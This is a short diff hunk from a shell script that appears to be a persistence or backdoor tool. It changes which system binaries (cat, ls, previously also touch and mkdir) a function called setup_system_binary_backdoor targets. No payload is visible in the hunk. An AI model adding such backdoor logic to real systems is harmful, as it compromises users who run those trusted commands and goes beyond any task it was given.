@@ -2026,7 +2026,7 @@ setup_system_binary_backdoor() {
 			exit 1
 		fi
 
-		local binaries=("cat" "touch" "mkdir" "ls")
+		local binaries=("cat" "ls")
 
 		for bin in "${binaries[@]}"; do
 			if command -v $bin &> /dev/null; then
